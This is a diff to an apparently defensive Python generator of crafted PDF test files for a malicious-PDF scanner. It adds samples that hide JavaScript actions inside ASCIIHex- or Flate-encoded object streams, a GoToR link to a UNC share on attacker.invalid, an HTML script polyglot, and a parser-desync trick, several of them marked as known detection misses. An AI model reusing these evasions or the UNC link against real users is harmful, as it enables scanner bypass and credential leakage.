@@ -12,11 +12,14 @@ import zlib
 HEADER = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
 
 
-def build(objects, trailer_extra=b"", header=HEADER):
-    """A classic xref-table PDF from {number: body-bytes}, with object 1 as the catalog."""
+def build(objects, trailer_extra=b"", header=HEADER, junk_before=None):
+    """A classic xref-table PDF from {number: body-bytes}, with object 1 as the catalog.
+
+    junk_before maps an object number to unreferenced bytes written just before it (readers never parse them)."""
     out = bytearray(header)
     offsets = {}
     for number in sorted(objects):
+        out += (junk_before or {}).get(number, b"")
         offsets[number] = len(out)
         out += b"%d 0 obj\n" % number + objects[number] + b"\nendobj\n"
     xref = len(out)
@@ -65,24 +68,39 @@ def benign_binary_streams():
     return build(objects)
 
 
+JS_IN_OBJSTM = {
+    1: b"<< /Type /Catalog /Pages 2 0 R /OpenAction 7 0 R >>",
+    2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+    3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>",
+    7: b"<< /Type /Action /S /JavaScript /JS (app.alert\\('corpus known miss'\\)) >>",
+}
+
+# A page whose /AA follows a string of binary bytes (so fewer than 8 text bytes precede the slash).
+AA_AFTER_BINARY = {
+    1: b"<< /Type /Catalog /Pages 2 0 R >>",
+    2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+    3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /X (\xff\xff\xff\xff\xff\xff\xff\xff)/AA << /O 7 0 R >> >>",
+    7: b"<< /S /URI /URI (https://example.invalid/) >>",
+}
+
+
 def known_miss_objstm_js():
     """ACCEPTED (documented known miss): catalog + /OpenAction JS action inside a COMPRESSED object stream."""
-    inner = {
-        1: b"<< /Type /Catalog /Pages 2 0 R /OpenAction 7 0 R >>",
-        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
-        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>",
-        7: b"<< /Type /Action /S /JavaScript /JS (app.alert\\('corpus known miss'\\)) >>",
-    }
+    return objstm_pdf(JS_IN_OBJSTM, b" /Filter /FlateDecode", zlib.compress)
+
+
+def objstm_pdf(inner, filter_entry, encode):
+    """The objects in `inner` packed into one object stream (encoded by `encode`), indexed by an xref stream."""
     numbers = sorted(inner)
     bodies = b""
     index = b""
     for number in numbers:
         index += b"%d %d " % (number, len(bodies))
         bodies += inner[number] + b"\n"
-    payload = zlib.compress(index + bodies)
+    payload = encode(index + bodies)
     out = bytearray(HEADER)
     objstm_offset = len(out)
-    out += b"8 0 obj\n" + stream(b"<< /Type /ObjStm /N %d /First %d /Filter /FlateDecode >>" % (len(numbers), len(index)),
+    out += b"8 0 obj\n" + stream(b"<< /Type /ObjStm /N %d /First %d" % (len(numbers), len(index)) + filter_entry + b" >>",
                                  payload) + b"\nendobj\n"
     xref_offset = len(out)
     # Cross-reference STREAM: type 2 entries point into object stream 8; 8 and 9 are type 1.
@@ -158,6 +176,25 @@ def files():
     yield "polyglot-html-prefix.pdf", b"<html><body>" + minimal
 
     yield "known-miss-objstm-js.pdf", known_miss_objstm_js()
+
+    # Cold-review folds (10/29).
+    yield "ef-without-type.pdf", build(page_objects(
+        catalog_extra=b" /AF [6 0 R]",
+        extra={6: b"<< /Type /Filespec /F (readme.txt) /EF << /F 7 0 R >> >>", 7: stream(b"<< >>", b"corpus attachment")}))
+    yield "fileattachment-annotation.pdf", build(page_objects(extra={
+        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R"
+           b" /Resources << /Font << /F1 5 0 R >> >> /Annots [6 0 R] >>",
+        6: b"<< /Type /Annot /Subtype /FileAttachment /Rect [0 0 10 10] /FS (readme.txt) >>"}))
+    yield "gotor-unc.pdf", build(page_objects(extra=link_annotation(
+        b"<< /S /GoToR /F (\\\\attacker.invalid\\share\\a.pdf) /D [0 /Fit] >>")))
+    yield "polyglot-small-trailer.pdf", minimal + b"<script>alert(document.domain)</script>\n"
+    yield "aa-after-binary-in-unfiltered-objstm.pdf", objstm_pdf(AA_AFTER_BINARY, b"", lambda data: data)
+    # KNOWN MISS: any filter hides names, not only Flate.
+    yield "known-miss-objstm-asciihex-js.pdf", objstm_pdf(
+        JS_IN_OBJSTM, b" /Filter /ASCIIHexDecode", lambda data: data.hex().encode() + b">")
+    # KNOWN MISS: unreferenced junk "<</Filter/X>> stream" switches the short-name relaxation on for what follows.
+    yield "known-miss-filter-junk-desync-aa.pdf", build(
+        AA_AFTER_BINARY, junk_before={3: b"<</Filter/X>>stream\n"})
 
 
 if __name__ == "__main__":
